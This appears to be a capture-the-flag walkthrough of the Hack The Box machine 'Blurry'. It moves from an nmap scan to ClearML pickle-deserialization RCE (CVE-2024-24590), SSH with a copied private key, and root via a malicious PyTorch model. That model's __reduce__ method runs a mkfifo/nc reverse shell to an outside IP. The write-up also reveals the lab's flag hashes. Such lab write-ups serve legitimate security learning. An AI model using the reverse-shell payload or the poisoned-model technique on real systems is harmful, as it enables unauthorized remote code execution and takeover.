

Hola! Today lets deep dive into another adventure called "[Blurry](https://app.hackthebox.com/machines/Blurry)"


The Linux-based system known as “**Blurry**” **Active Machine** is rated as having medium difficulty.

## Reconnaissance

Like always start with initial footholding scans on the `ip` with `nmap`

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/blurry]
└─$ nmap -sCV -Pn 10.10.11.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 21:45 IST
Nmap scan report for 10.10.11.19
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.53 seconds
```

There are 2 open ports.

- `SSH` & `HTTP`

Since we have two attack surfaces here. Let's check with the obvious one first which is port `80` (`HTTP`). Let's add this `ipaadr` to the local dns file.

When you visit the website, you'll see the ClearML dashboard. The ClearML dashboard provided an overview of the various tasks, datasets, and machine learning experiments.  
  
You can join the project as a developer after submitting any name; however, we must first set it up on our computer.


![[Pasted image 20241012010016.png]]

We can see an empty dashboard but if you search up the site you can find previous projects offering a summary of different tasks, datasets and machine learning experiments.



This room revolves around MLops and you can learn more about [Clearml](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/#Basics-of-ClearML) from here.

The [ClearML Python package](https://github.com/allegroai/clearml) is used to interact with a ClearML Server instance via an API to perform management tasks, such as:

- logging and sharing of models,
- uploading and manipulating datasets,
- running and managing experiments and projects.

These are list of vulnerabilities associated with clearml but for this room we will be using the first one 

- **CVE-2024–24590**: Pickle Load on Artifact Get
- CVE-2024–24591: Path Traversal on File Download
- CVE-2024–24592: Improper Auth Leading to Arbitrary Read-Write Access
- CVE-2024–24593: Cross-Site Request Forgery in ClearML Server
- CVE-2024–24594: Web Server Renders User HTML Leading to XSS
- CVE-2024–24595: Credentials Stored in Plaintext in MongoDB Instance

Before exploitation phase setup clearml virtual env in your machine 

#### Step 1: Install Python 3 and venv

1. **Update Package List:**

```bash
sudo apt update
```

2. **Install Python 3 and venv (if not already installed):**
```bash
sudo apt install python3 python3-venv python3-pip
```

#### Step 2: Create a Virtual Environment

1. **Navigate to your project directory:**
```bash
cd ~/Desktop/htb/machines/blurry/CVE-2024-24590-ClearML-RCE-Exploit
```
   
2. **Create a virtual environment:**
 ```bash
 python3 -m venv venv-clearml
```
 
#### Step 3: Activate the Virtual Environment

1. **Activate the virtual environment:**
```bash
source venv-clearml/bin/activate
```    

You should see the virtual environment name (`(venv-clearml)`) in your terminal prompt.

### Step 4: Install Required Packages

1. **Install the required packages:**
```bash
pip install clearml colorama pwntools
```

### Step 5: Verify Installation

1. Once installed and verified run the command `clearml init` and configure it with the credentials from `/settings/workspace-configuration`

2. Go to `app.blurry.htb/login`  give any string as name.

3. Once in head to `http://app.blurry.htb/settings/workspace-configuration` and generate new credentials and copy the given code to clipboard.

4. Paste it in the terminal  and if done right the ClearML will  setup successfully with no issues.

## Exploitation

1. First step is to clone the following [RCE exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit?source=post_page-----6c537e51ec51--------------------------------) repository

2. Then run the exploit.py file.

3. Now select the Run exploit option.

4. Input your `ipaddr` and preferred `port` such as 5555 and also run a listener on another terminal. 

5. Input project name as `Black Swan`

![[Pasted image 20241012024446.png]]

If done right the script gets successfully executed and you will get a reverse shell in name of `jippit@blurry`

![[Pasted image 20241012024500.png]]

Since we got our reverse shell lets make it interactive by upgrading it.

- **Spawn a TTY Shell**:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
``` 

- **Send a Background Signal**: After running the above command, press `CTRL + Z` to suspend the shell.
    
- **Restore the Shell**: Type the following command to bring it back to the foreground:

 ```bash
stty raw -echo; fg
```
    
- **Set Environment Variables**: Finally, execute:

```bash
export SHELL=bash export TERM=xterm-256color
```

Once done, you can list the current directory and find the `user` flag.

![[Pasted image 20241012030628.png]]


## Privelage escalation

1. Now we need to get super user permissions in order to access the root flag.

2. After wasting a couple of minutes rummaging through the directories found `.ssh` directory

3. It consists of a private key `id_rsa` make a copy of it and login to the ssh port using it.

4. Once copied into your machine alter the file permissions

```bash
chmod 600 id_rsa
```

Once done connect to the open `ssh` port

```bash
┌──(dkvv㉿kali)-[~/Desktop/htb/machines/blurry]
└─$ ssh -i id_rsa jippity@10.10.11.19
The authenticity of host '10.10.11.19 (10.10.11.19)' can't be established.
ED25519 key fingerprint is SHA256:Yr2plP6C5tZyGiCNZeUYNDmsDGrfGijissa6WJo0yPY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.19' (ED25519) to the list of known hosts.
Linux blurry 5.10.0-30-amd64 #1 SMP Debian 5.10.218-1 (2024-06-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: ------------------
jippity@blurry:~$ 

```

5. Utilizing the `sudo -l` command The command reveals that the user `jippity` can execute `/usr/bin/evaluate_model` with root privileges without a password, specifically targeting any model files with a `.pth` extension located in the `/models/` directory. 

6. This indicates a potential privilege escalation opportunity by manipulating the model files to execute arbitrary commands as root.

7. This permission could be exploited by a payload script also run a nc listner to pick the rev shell 

```python
import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)
    
    def forward(self, exploit): 
        return self.dense(exploit)
   
    def __reduce__(self):
        cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.140 4444 >/tmp/f" #change ip and port
        return os.system, (cmd,)

malicious_model = MaliciousModel()

torch.save(malicious_model, 'exploit.pth')

```

8. Go to the tmp directory for making a file and paste the content of the malicious payload into it using this command : -

```bash
jippity@blurry:/$ cd tmp/
jippity@blurry:/tmp$ nano rootexploit.py
jippity@blurry:/tmp$ python3 rootexploit.py 
```

9. Now you can find a new file named `exploit.pth`  and we can copy this into the `model` directory.

```bash
cp exploit.pth /models
```

10. Now head to `models` directory since we can run command in this folder without superuser privs.The command `sudo /usr/bin/evaluate_model /models/exploit.pth` is used to execute the `evaluate_model` program with superuser privileges, specifically targeting the model file located at `/models/exploit.pth`.

```bash
sudo /usr/bin/evaluate_model /models/exploit.pth
```

Note: The files will be automatically deleted  in `models` directory. So execute the above command quickly.

11. Once you get the rev shell go to `/root` directory to get the root flag.

![[Pasted image 20241012034214.png]]



![[Pasted image 20241012035451.png]]


<details>
  <summary>Click to reveal</summary>
  User: e28063901628b4d47c18ae68eed0cdea
  Root: 27a2cd19ba7f941f2422484cb5974941
</details>


## References:
1. [ClearML](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/#Basics-of-ClearML) : ClearML is a highly scalable MLOps platform well known for its integration capabilities with popular machine learning frameworks and tools.
2. [Clear ML python packages](https://github.com/allegroai/clearml) :  A repository to help manage machine learning projects
3. [# CVE-2024-24590-ClearML-RCE-Exploit](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit?source=post_page-----6c537e51ec51--------------------------------): Python script that exploits the vulnerability CVE-2024-24590 in ClearML, leveraging pickle file deserialization to execute arbitrary code.
